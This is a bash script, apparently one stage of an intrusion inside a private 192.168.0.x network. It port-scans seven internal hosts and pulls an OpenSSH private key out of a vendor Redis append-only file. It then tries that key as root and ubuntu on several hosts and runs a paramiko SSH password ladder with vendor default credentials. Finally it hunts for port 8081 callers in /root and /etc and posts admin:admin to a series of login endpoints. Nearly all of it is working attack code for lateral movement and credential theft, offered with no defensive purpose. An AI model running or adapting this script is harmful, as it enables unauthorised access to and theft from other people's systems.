#!/bin/bash
# exec5: full-port scan of workers/mgmt, redis key test, bounded ssh password ladder, 8081 caller hunt
echo "=== ID"; hostname; command -v python3; python3 -c 'import paramiko' 2>&1 | head -1; command -v sshpass
mkdir -p /dev/shm/ul5205
echo "=== FULLSCAN"
cat > /dev/shm/ul5205/scan.py <<'PY'
import asyncio,sys
async def scan(h):
    open_ports=[]
    sem=asyncio.Semaphore(700)
    async def one(p):
        async with sem:
            try:
                r,w=await asyncio.wait_for(asyncio.open_connection(h,p),timeout=0.6)
                w.close()
                open_ports.append(p)
            except Exception:
                pass
    for base in range(1,65536,2048):
        await asyncio.gather(*[one(p) for p in range(base,min(base+2048,65536))])
    print("SCAN %s %s" % (h, sorted(open_ports)), flush=True)
for h in sys.argv[1:]:
    asyncio.run(scan(h))
PY
timeout 900 python3 /dev/shm/ul5205/scan.py 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.21 192.168.0.22 2>&1 | grep -a '^SCAN'
echo "=== REDISKEY"
strings /ssd/vendors/INSPUR/redis/data/appendonlydir/*.aof 2>/dev/null | sed 's/\\n/\n/g' | awk '/BEGIN OPENSSH PRIVATE KEY/{f=1} f{print} /END OPENSSH PRIVATE KEY/{exit}' > /dev/shm/ul5205/rk 2>/dev/null
wc -c /dev/shm/ul5205/rk; ssh-keygen -lf /dev/shm/ul5205/rk 2>&1 | head -2; head -1 /dev/shm/ul5205/rk
chmod 600 /dev/shm/ul5205/rk
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do for u in root ubuntu; do
  echo "KEYTRY $u@$h: $(timeout 10 ssh -i /dev/shm/ul5205/rk -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes $u@$h 'id; hostname' 2>&1 | tail -1 | cut -c1-120)"
done; done
echo "=== PWDLADDER"
PWD_LIST="root root 123456 Admin@123 Huawei@123 inspur Inspur@123 calvin Passw0rd admin"
if python3 -c 'import paramiko' 2>/dev/null; then
python3 - <<'PY'
import paramiko,socket
hosts=["192.168.0.24","192.168.0.28","192.168.0.30","192.168.0.31","192.168.0.20","192.168.0.21","192.168.0.22"]
pairs=[("root","root"),("root","123456"),("root","Admin@123"),("root","Huawei@123"),("root","inspur"),("root","calvin"),("admin","admin"),("ubuntu","ubuntu"),("inspur","Inspur@123"),("root","Passw0rd")]
for h in hosts:
    for u,p in pairs:
        c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(h,22,username=u,password=p,timeout=6,banner_timeout=8,allow_agent=False,look_for_keys=False)
            i,o,e=c.exec_command("id; hostname")
            print("PWHIT %s %s:%s %s" % (h,u,"*"*len(p),o.read().decode()[:120].strip()))
        except paramiko.AuthenticationException:
            pass
        except Exception as ex:
            print("PWERR %s %s %s" % (h,u,type(ex).__name__))
        finally:
            try: c.close()
            except: pass
PY
else echo "no paramiko"; fi
echo "=== CALLER8081"
timeout 60 grep -rn --include=*.py --include=*.js --include=*.json --include=*.yaml --include=*.yml --include=*.conf --include=*.env -E '192\.168\.0\.20:8081|:8081/' /ssd/vendors /root /etc 2>/dev/null | grep -v '\.venv\|node_modules\|site-packages' | cut -c1-200 | head -15
echo "=== 8081PROBE"
for p in /api/login /login /auth/login /api/v1/login /api/user/login /api/health /health /api/v1/health /swagger-ui.html /v3/api-docs /api/v1/nodes /api/nodes; do
  echo "--- $p"; timeout 8 curl -s -m 6 -X POST -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' -w " [%{http_code}]\n" "http://192.168.0.20:8081$p" 2>&1 | head -c 220; echo; done
echo "=== DONE"
